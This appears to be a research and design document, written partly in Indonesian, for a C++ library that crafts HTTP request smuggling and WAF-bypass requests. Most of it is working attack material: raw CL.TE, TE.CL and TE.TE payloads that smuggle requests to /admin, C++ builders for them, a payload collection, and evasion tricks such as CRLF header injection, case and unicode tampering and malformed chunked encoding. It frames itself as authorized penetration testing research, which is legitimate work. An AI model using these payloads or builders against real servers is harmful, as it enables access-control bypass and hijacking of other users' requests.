# Research: HTTP Parser dan Request Smuggling

## Overview

HTTP parser adalah komponen yang memungkinkan kita membuat request yang sengaja ambigu atau malformed untuk testing HTTP Request Smuggling dan WAF bypass.

## HTTP Request Smuggling Basics

### CL.TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com

```

Frontend server menggunakan Content-Length (44 bytes), tapi backend menggunakan Transfer-Encoding (hanya sampai "0\r\n\r\n"). Sisanya menjadi bagian dari request berikutnya.

### TE.CL (Transfer-Encoding vs Content-Length)
```
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin HTTP/1.1
Host: vulnerable.com
0

X
```

Frontend menggunakan Transfer-Encoding, backend menggunakan Content-Length.

### TE.TE (Transfer-Encoding Obfuscation)
```
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

0

GET /admin HTTP/1.1
```

Kedua server support Transfer-Encoding tapi salah satu mengabaikan header yang di-obfuscate.

## HTTP Parser Implementation

### Request Builder
```cpp
class HTTPRequest {
private:
    string method;
    string path;
    string version;
    map<string, vector<string>> headers;  // Support multiple headers dengan same name
    string body;
    
public:
    HTTPRequest(const string& method, const string& path)
        : method(method), path(path), version("HTTP/1.1") {}
    
    // Normal header setting
    void setHeader(const string& name, const string& value) {
        headers[name] = {value};
    }
    
    // Add header (allows duplicates)
    void addHeader(const string& name, const string& value) {
        headers[name].push_back(value);
    }
    
    void setBody(const string& body) {
        this->body = body;
    }
    
    // Build normal request
    string build() const {
        stringstream ss;
        ss << method << " " << path << " " << version << "\r\n";
        
        for (const auto& [name, values] : headers) {
            for (const auto& value : values) {
                ss << name << ": " << value << "\r\n";
            }
        }
        
        ss << "\r\n" << body;
        return ss.str();
    }
};
```

### Advanced Request Builder (untuk Smuggling)
```cpp
class HTTPSmugglingRequest {
private:
    vector<string> raw_lines;  // Store lines untuk manipulation
    
public:
    // Add line manually (full control)
    void addRawLine(const string& line) {
        raw_lines.push_back(line);
    }
    
    // Add malformed header
    void addMalformedHeader(const string& name, const string& value, 
                           const string& separator = ": ") {
        raw_lines.push_back(name + separator + value);
    }
    
    // Add header dengan extra spaces
    void addHeaderWithExtraSpaces(const string& name, const string& value) {
        raw_lines.push_back(name + " :  " + value);  // Extra spaces
    }
    
    // Add header dengan special characters
    void addHeaderWithSpecialChars(const string& name, const string& value) {
        // e.g., "Transfer-Encoding\t: chunked"
        raw_lines.push_back(name + "\t: " + value);
    }
    
    // Build CL.TE smuggling request
    string buildCLTE(const string& smuggled_request) {
        stringstream ss;
        ss << "POST / HTTP/1.1\r\n";
        ss << "Host: target.com\r\n";
        
        // Craft Content-Length dan Transfer-Encoding
        string prefix = "0\r\n\r\n";
        size_t total_length = prefix.length() + smuggled_request.length();
        
        ss << "Content-Length: " << total_length << "\r\n";
        ss << "Transfer-Encoding: chunked\r\n";
        ss << "\r\n";
        ss << prefix << smuggled_request;
        
        return ss.str();
    }
    
    // Build TE.CL smuggling request
    string buildTECL(const string& smuggled_request) {
        stringstream ss;
        ss << "POST / HTTP/1.1\r\n";
        ss << "Host: target.com\r\n";
        ss << "Transfer-Encoding: chunked\r\n";
        
        // Smuggled request dalam chunk
        string chunk_content = smuggled_request;
        stringstream chunk;
        chunk << hex << chunk_content.length() << "\r\n";
        chunk << chunk_content << "\r\n";
        chunk << "0\r\n\r\n";
        
        // Content-Length yang lebih kecil
        ss << "Content-Length: 4\r\n";
        ss << "\r\n";
        ss << chunk.str();
        
        return ss.str();
    }
    
    // Build TE.TE dengan obfuscation
    string buildTETE(const string& smuggled_request, 
                     const string& obfuscation = "identity") {
        stringstream ss;
        ss << "POST / HTTP/1.1\r\n";
        ss << "Host: target.com\r\n";
        ss << "Transfer-Encoding: chunked\r\n";
        ss << "Transfer-Encoding: " << obfuscation << "\r\n";  // Obfuscated
        ss << "\r\n";
        ss << "0\r\n\r\n";
        ss << smuggled_request;
        
        return ss.str();
    }
    
    // Build dengan custom line endings (CRLF vs LF)
    string buildWithMixedLineEndings() {
        stringstream ss;
        for (size_t i = 0; i < raw_lines.size(); i++) {
            ss << raw_lines[i];
            // Mix CRLF dan LF
            if (i % 2 == 0) {
                ss << "\r\n";
            } else {
                ss << "\n";  // Just LF
            }
        }
        return ss.str();
    }
};
```

## Response Parser

### Basic Response Parser
```cpp
class HTTPResponse {
public:
    int status_code;
    string status_message;
    map<string, string> headers;
    string body;
    
    static HTTPResponse parse(const string& raw_response) {
        HTTPResponse response;
        istringstream stream(raw_response);
        string line;
        
        // Parse status line
        getline(stream, line);
        // HTTP/1.1 200 OK
        istringstream status_stream(line);
        string version;
        status_stream >> version >> response.status_code;
        getline(status_stream, response.status_message);
        
        // Parse headers
        while (getline(stream, line) && line != "\r") {
            size_t colon = line.find(':');
            if (colon != string::npos) {
                string name = line.substr(0, colon);
                string value = line.substr(colon + 1);
                // Trim spaces
                value.erase(0, value.find_first_not_of(" \t"));
                response.headers[name] = value;
            }
        }
        
        // Parse body
        stringstream body_stream;
        body_stream << stream.rdbuf();
        response.body = body_stream.str();
        
        return response;
    }
    
    // Check if response is chunked
    bool isChunked() const {
        auto it = headers.find("Transfer-Encoding");
        return it != headers.end() && it->second.find("chunked") != string::npos;
    }
    
    // Decode chunked response
    string decodeChunked() const {
        stringstream result;
        istringstream stream(body);
        string line;
        
        while (getline(stream, line)) {
            // Read chunk size
            size_t chunk_size;
            istringstream(line) >> hex >> chunk_size;
            
            if (chunk_size == 0) break;
            
            // Read chunk data
            vector<char> chunk(chunk_size);
            stream.read(chunk.data(), chunk_size);
            result.write(chunk.data(), chunk_size);
            
            // Skip trailing CRLF
            getline(stream, line);
        }
        
        return result.str();
    }
};
```

## WAF Bypass Techniques

### 1. Request Splitting
```cpp
string buildSplitRequest() {
    // Send request in multiple small packets
    string req1 = "GET /admin";
    string req2 = " HTTP/1.1\r\n";
    string req3 = "Host: target.com\r\n\r\n";
    
    // These will be sent as separate TCP packets
    return req1 + "|||" + req2 + "|||" + req3;  // Delimiter untuk split
}
```

### 2. Header Injection
```cpp
void addHeaderInjection(HTTPSmugglingRequest& req) {
    // Inject CRLF dalam header value
    req.addRawLine("X-Custom: value\r\nX-Injected: injected");
    
    // Some WAF might not properly parse this
}
```

### 3. HTTP Verb Tampering
```cpp
void addVerbTampering(HTTPSmugglingRequest& req) {
    // Uncommon HTTP methods
    req.addRawLine("PATCH /admin HTTP/1.1");
    // or
    req.addRawLine("PROPFIND /admin HTTP/1.1");
}
```

### 4. Case Sensitivity
```cpp
void addCaseTampering(HTTPSmugglingRequest& req) {
    // Mixed case headers
    req.addRawLine("CoNtEnT-LeNgTh: 100");
    req.addRawLine("TrAnSfEr-EnCoDiNg: chunked");
}
```

### 5. Unicode/UTF-8 Tricks
```cpp
void addUnicodeTampering(HTTPSmugglingRequest& req) {
    // Full-width characters
    req.addRawLine("GET /ａｄｍｉｎ HTTP/1.1");
    
    // URL encoding
    req.addRawLine("GET /%61%64%6d%69%6e HTTP/1.1");
}
```

## Request Variations Builder

### Request Template System
```cpp
class RequestTemplate {
private:
    string template_str;
    map<string, string> variables;
    
public:
    RequestTemplate(const string& templ) : template_str(templ) {}
    
    void setVariable(const string& name, const string& value) {
        variables[name] = value;
    }
    
    string render() {
        string result = template_str;
        for (const auto& [name, value] : variables) {
            string placeholder = "{{" + name + "}}";
            size_t pos = 0;
            while ((pos = result.find(placeholder, pos)) != string::npos) {
                result.replace(pos, placeholder.length(), value);
                pos += value.length();
            }
        }
        return result;
    }
};

// Usage
RequestTemplate templ(
    "POST {{path}} HTTP/1.1\r\n"
    "Host: {{host}}\r\n"
    "Content-Length: {{cl}}\r\n"
    "Transfer-Encoding: {{te}}\r\n"
    "\r\n"
    "{{body}}"
);
templ.setVariable("path", "/");
templ.setVariable("host", "target.com");
templ.setVariable("cl", "44");
templ.setVariable("te", "chunked");
```

## Chunked Transfer Encoding

### Chunked Encoder
```cpp
class ChunkedEncoder {
public:
    static string encode(const string& data) {
        stringstream ss;
        
        // Send in chunks
        size_t offset = 0;
        size_t chunk_size = 1024;  // Or variable size
        
        while (offset < data.length()) {
            size_t remaining = data.length() - offset;
            size_t current_chunk = min(chunk_size, remaining);
            
            // Chunk size in hex
            ss << hex << current_chunk << "\r\n";
            // Chunk data
            ss << data.substr(offset, current_chunk) << "\r\n";
            
            offset += current_chunk;
        }
        
        // Final chunk
        ss << "0\r\n\r\n";
        
        return ss.str();
    }
    
    // Encode dengan chunk sizes yang tidak normal (untuk evasion)
    static string encodeWithVariableChunks(const string& data, 
                                          const vector<size_t>& chunk_sizes) {
        stringstream ss;
        size_t offset = 0;
        
        for (size_t chunk_size : chunk_sizes) {
            if (offset >= data.length()) break;
            
            size_t current_chunk = min(chunk_size, data.length() - offset);
            ss << hex << current_chunk << "\r\n";
            ss << data.substr(offset, current_chunk) << "\r\n";
            offset += current_chunk;
        }
        
        // Remaining data
        if (offset < data.length()) {
            size_t remaining = data.length() - offset;
            ss << hex << remaining << "\r\n";
            ss << data.substr(offset) << "\r\n";
        }
        
        ss << "0\r\n\r\n";
        return ss.str();
    }
};
```

### Malformed Chunked Encoding
```cpp
class MalformedChunkedEncoder {
public:
    // Invalid chunk size
    static string encodeWithInvalidSize(const string& data) {
        stringstream ss;
        ss << "INVALID\r\n";  // Non-hex chunk size
        ss << data << "\r\n";
        ss << "0\r\n\r\n";
        return ss.str();
    }
    
    // Missing CRLF
    static string encodeWithMissingCRLF(const string& data) {
        stringstream ss;
        ss << hex << data.length() << "\n";  // Just LF, no CR
        ss << data << "\r\n";
        ss << "0\r\n\r\n";
        return ss.str();
    }
    
    // Extra whitespace
    static string encodeWithExtraWhitespace(const string& data) {
        stringstream ss;
        ss << hex << data.length() << " \r\n";  // Space before CRLF
        ss << data << "\r\n";
        ss << "0\r\n\r\n";
        return ss.str();
    }
};
```

## HTTP/2 Considerations

### HTTP/2 Smuggling
HTTP/2 menggunakan binary framing, tapi jika ada downgrade ke HTTP/1.1, bisa terjadi smuggling.

```cpp
// Pseudo-headers dalam HTTP/2
struct HTTP2Request {
    string method;
    string scheme;
    string authority;
    string path;
    map<string, string> headers;
    string body;
};
```

## Testing Payloads

### Common Smuggling Payloads
```cpp
namespace SmugglingPayloads {
    const string CLTE_BASIC = 
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "\r\n";
    
    const string TECL_BASIC = 
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "0\r\n"
        "\r\n"
        "X";
    
    const string TETE_OBFUSCATION = 
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n";
}
```

## Detection Techniques

### Timing-Based Detection
```cpp
class SmugglingDetector {
public:
    static bool detectCLTE(const string& host, uint16_t port) {
        // Send request yang seharusnya di-queue jika vulnerable
        HTTPSmugglingRequest req;
        string smuggling_req = req.buildCLTE("GET /404 HTTP/1.1\r\nHost: " + host + "\r\n\r\n");
        
        // Send smuggling request
        auto start = chrono::steady_clock::now();
        sendRequest(host, port, smuggling_req);
        
        // Send normal request
        string normal_req = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
        sendRequest(host, port, normal_req);
        auto end = chrono::steady_clock::now();
        
        // If second request gets 404, server is vulnerable
        // Check timing - vulnerable servers may delay
        auto duration = chrono::duration_cast<chrono::milliseconds>(end - start);
        
        return duration.count() > EXPECTED_TIME_MS;
    }
};
```

## Implementation Strategy

### Phase 1: Basic HTTP Parser
- [ ] Implement request builder
- [ ] Implement response parser
- [ ] Support basic headers

### Phase 2: Smuggling Capabilities
- [ ] CL.TE builder
- [ ] TE.CL builder
- [ ] TE.TE builder
- [ ] Custom line endings

### Phase 3: Advanced Features
- [ ] Chunked encoding
- [ ] Header obfuscation
- [ ] HTTP/2 support

## Security Considerations

**IMPORTANT**: This library is for authorized penetration testing only.

```cpp
// Add warning in code
#warning "This library is designed for security testing with proper authorization"

// Runtime disclaimer
void printDisclaimer() {
    cout << "WARNING: This tool is for authorized security testing only.\n"
         << "Unauthorized use may violate laws and regulations.\n"
         << "Ensure you have explicit permission before testing.\n";
}
```

## References

1. **HTTP Request Smuggling**: PortSwigger Research
2. **RFC 7230**: HTTP/1.1 Message Syntax
3. **RFC 7540**: HTTP/2 Specification
4. **Smuggler Tool**: James Kettle's research

## Next Steps

1. Implement basic HTTP request builder
2. Test with simple servers
3. Add smuggling variations
4. Validate with Burp Suite
